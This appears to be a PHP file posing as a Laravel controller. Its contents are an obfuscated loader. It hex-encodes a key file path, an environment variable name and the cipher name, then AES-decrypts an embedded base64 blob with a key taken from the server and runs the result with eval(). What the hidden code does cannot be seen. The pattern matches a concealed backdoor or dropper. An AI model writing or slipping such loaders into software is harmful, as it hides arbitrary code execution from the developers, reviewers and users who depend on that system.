<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('/aOf3fS9yhuvuzF7oSr4ag==');

$c=base64_decode(

'E8mtd7uKWk/B9Ey8gPG++RGXfwv7oH37v9vTL/QbIUgnxEbX99J29YBA+FiJqTcNyibnLmirNn86' .
'NKYVEbzSZemtYk5U4lL6jTHT/Ety8ImjIe910jPtO7UO1mucMuScVwUU/o1Th1iFprFmoSQ4+GS0' .
'CHqlpBOw1a3wrpRf5sz/5ZOn4yz4z5Zu06a+Yny/mBZ7JqxglWTCPuk6Mqm9q3wA+H71qXJChhBH' .
'nwADmBk8W5MYM51wiEJuOVqq1vSU'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

